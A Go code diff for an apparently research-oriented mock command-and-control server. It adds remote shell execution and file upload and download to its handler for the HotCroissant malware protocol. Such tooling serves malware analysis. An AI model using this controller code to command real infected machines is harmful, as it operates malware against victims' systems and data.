@@ -6,22 +6,37 @@ import (
 	"crypto/sha256"
 	"encoding/binary"
 	"encoding/hex"
+	"io"
 	"io/ioutil"
-	"net"
+	"math/rand"
+	"os"
+	"strconv"
+	"strings"
+	"time"
 
 	"megaman.genesis.local/sknight/mockc2/internal/log"
 	"megaman.genesis.local/sknight/mockc2/internal/queue"
 )
 
 const (
-	hcBeacon = 0x7c8
+	hcBeacon       = 0x7c8
+	hcFileData     = 0x7e4
+	hcFileComplete = 0x7e5
+	hcFileDownload = 0x7e6
+	hcFileStatus   = 0x7e7
+	hcFileUpload   = 0x7ed
+	hcShellStart   = 0xfa1
+	hcShellData    = 0xfa2
+	hcShellStop    = 0xfa3
 )
 
 // HotCroissant is a protocol handler capable of communicating with the
 // HotCroissant malware family.
 type HotCroissant struct {
-	delegate ProtocolDelegate
-	dataChan chan byte
+	delegate     ProtocolDelegate
+	dataChan     chan byte
+	uploadJobs   map[string]chan int32
+	downloadJobs map[string]*os.File
 }
 
 type hcEncodedCommand struct {
@@ -60,19 +75,170 @@ func (h *HotCroissant) ReceiveData(data []byte) {
 
 // SendCommand sends a command to the connected agent.
 func (h *HotCroissant) SendCommand(command interface{}) {
-	switch command.(type) {
+	switch c := command.(type) {
 	case ExecuteCommand:
-		log.Warn("hotcroissant doesn't support command execution")
+		commandLine := strings.TrimSpace(c.Name + " " + strings.Join(c.Args, " "))
+		h.execute(commandLine)
 	case UploadCommand:
-		log.Warn("hotcroissant doesn't support file upload")
+		h.upload(c.Source, c.Destination)
 	case DownloadCommand:
-		log.Warn("hotcroissant doesn't support file download")
+		h.download(c.Source, c.Destination)
 	}
 }
 
 // Close cleans up any uzed resources.
 func (h *HotCroissant) Close() {
 	close(h.dataChan)
+}
+
+func (h *HotCroissant) execute(command string) {
+	// Start shell
+	c := hcCommand{}
+	c.opcode = hcShellStart
+	c.opt1 = 0x0
+	c.opt2 = 0x0
+	c.opt3 = 0x0
+	err := h.sendData(c)
+	if err != nil {
+		log.Warn("Error sending command: ", err)
+	}
+
+	// Execute command
+	c = hcCommand{}
+	c.opcode = hcShellData
+	c.opt1 = 0x0
+	c.opt2 = 0x0
+	c.opt3 = 0x0
+	c.size = uint32(len(command))
+	c.data = append([]byte(command), 0x00)
+	err = h.sendData(c)
+	if err != nil {
+		log.Warn("Error sending command: ", err)
+	}
+
+	// Wait for response
+	time.Sleep(2 * time.Second)
+
+	// Shut down shell
+	c = hcCommand{}
+	c.opcode = hcShellStop
+	c.opt1 = 0x0
+	c.opt2 = 0x0
+	c.opt3 = 0x0
+	err = h.sendData(c)
+	if err != nil {
+		log.Warn("Error sending command: ", err)
+	}
+}
+
+func (h *HotCroissant) upload(source string, destination string) {
+	if h.uploadJobs == nil {
+		h.uploadJobs = make(map[string]chan int32)
+	}
+
+	// Start a file upload
+	jobID := rand.Uint32()
+	jobName := strconv.FormatInt(int64(jobID), 16)
+	data := jobName + "|" + destination
+
+	response := make(chan int32)
+
+	h.uploadJobs[jobName] = response
+
+	log.Info("Starting upload job %s", jobName)
+
+	c := hcCommand{}
+	c.opcode = hcFileUpload
+	c.opt1 = int32(jobID)
+	c.opt2 = 0x0
+	c.opt3 = 0x0
+	c.size = uint32(len(data))
+	c.data = append([]byte(data), 0x00)
+	err := h.sendData(c)
+	if err != nil {
+		log.Warn("Error sending command: ", err)
+	}
+
+	// Transfer data
+	opt2 := <-response
+
+	file, err := os.Open(source)
+	if err != nil {
+		log.Warn("Error opening source file: %v", err)
+		return
+	}
+	defer file.Close()
+
+	buf := make([]byte, 0x3a70)
+	for {
+		bytesRead, err := file.Read(buf)
+
+		if err != nil {
+			if err != io.EOF {
+				log.Warn("Error reading source file; %v", err)
+			}
+
+			break
+		}
+
+		c = hcCommand{}
+		c.opcode = hcFileData
+		c.opt1 = int32(jobID)
+		c.opt2 = opt2
+		c.opt3 = int32(bytesRead)
+		c.size = uint32(bytesRead)
+		c.data = buf[:bytesRead]
+		err = h.sendData(c)
+		if err != nil {
+			log.Warn("Error sending command: %v", err)
+		}
+	}
+
+	// Finish the file transfer
+	c = hcCommand{}
+	c.opcode = hcFileComplete
+	c.opt1 = int32(jobID)
+	c.opt2 = opt2
+	c.opt3 = 0x0
+	err = h.sendData(c)
+	if err != nil {
+		log.Warn("Error sending command: ", err)
+	}
+
+	log.Success("Upload job %s complete", jobName)
+}
+
+func (h *HotCroissant) download(source string, destination string) {
+	if h.downloadJobs == nil {
+		h.downloadJobs = make(map[string]*os.File)
+	}
+
+	// Start a file upload
+	file, err := os.Create(destination)
+	if err != nil {
+		log.Warn("Error opening destination file: %v", err)
+		return
+	}
+
+	jobID := rand.Uint32()
+	jobName := strconv.FormatInt(int64(jobID), 16)
+	data := jobName + "|" + source
+
+	h.downloadJobs[jobName] = file
+
+	log.Info("Starting download job %s", jobName)
+
+	c := hcCommand{}
+	c.opcode = hcFileDownload
+	c.opt1 = int32(jobID)
+	c.opt2 = 0x0
+	c.opt3 = 0x0
+	c.size = uint32(len(data))
+	c.data = append([]byte(data), 0x00)
+	err = h.sendData(c)
+	if err != nil {
+		log.Warn("Error sending command: ", err)
+	}
 }
 
 func (h *HotCroissant) processData() {
@@ -129,15 +295,54 @@ func (h *HotCroissant) proccessCommand(command hcCommand) {
 		a.ID = hex.EncodeToString(hash[:])
 
 		h.delegate.AgentConnected(a)
+	case hcFileUpload:
+		if command.opt2 == -1 {
+			log.Warn("Error opening destination file")
+		}
+
+		jobName := string(command.data)
+		if response, ok := h.uploadJobs[jobName]; ok {
+			response <- command.opt2
+		}
+	case hcFileStatus:
+		if strings.HasPrefix(string(command.data), "Failed to open") {
+			log.Warn("Error opening source file")
+			jobName := strconv.FormatInt(int64(uint32(command.opt1)), 16)
+
+			file, ok := h.downloadJobs[jobName]
+			if ok {
+				file.Close()
+				delete(h.downloadJobs, jobName)
+			}
+		}
+	case hcFileData:
+		jobName := strconv.FormatInt(int64(uint32(command.opt1)), 16)
+
+		file, ok := h.downloadJobs[jobName]
+		if ok {
+			file.Write(command.data)
+		}
+	case hcFileComplete:
+		jobName := strconv.FormatInt(int64(uint32(command.opt1)), 16)
+
+		file, ok := h.downloadJobs[jobName]
+		if ok {
+			file.Close()
+			delete(h.downloadJobs, jobName)
+		}
+
+		log.Success("Download job %s complete", jobName)
+	case hcShellData:
+		log.Info(string(command.data))
 	}
 }
 
 func logCommand(c hcCommand) {
 	log.Debug("HotCroissant Command")
 	log.Debug("Opcode: 0x%08x", c.opcode)
-	log.Debug("  Opt1: 0x%08x", c.opt1)
-	log.Debug("  Opt2: 0x%08x", c.opt2)
-	log.Debug("  Opt3: 0x%08x", c.opt3)
+	log.Debug("  Opt1: 0x%08x", uint32(c.opt1))
+	log.Debug("  Opt2: 0x%08x", uint32(c.opt2))
+	log.Debug("  Opt3: 0x%08x", uint32(c.opt3))
 	log.Debug("  Size: 0x%08x", c.size)
 	log.Debug("  Data:\n%s", hex.Dump(c.data))
 }
@@ -183,26 +388,22 @@ func decodeCommand(ec hcEncodedCommand) (hcCommand, error) {
 	return c, nil
 }
 
-func sendCommand(conn net.Conn, c hcCommand) error {
+func (h *HotCroissant) sendData(c hcCommand) error {
 	ec, err := encodeCommand(c)
 	if err != nil {
 		return err
 	}
 
-	err = binary.Write(conn, binary.LittleEndian, &ec.compressedSize)
-	if err != nil {
-		return err
+	result := make([]byte, 8+len(ec.data))
+
+	binary.LittleEndian.PutUint32(result[0:], ec.compressedSize)
+	binary.LittleEndian.PutUint32(result[4:], ec.uncompressedSize)
+
+	if len(ec.data) > 0 {
+		copy(result[8:], ec.data)
 	}
 
-	err = binary.Write(conn, binary.LittleEndian, &ec.uncompressedSize)
-	if err != nil {
-		return err
-	}
-
-	_, err = conn.Write(ec.data)
-	if err != nil {
-		return err
-	}
+	h.delegate.SendData(result)
 
 	return nil
 }
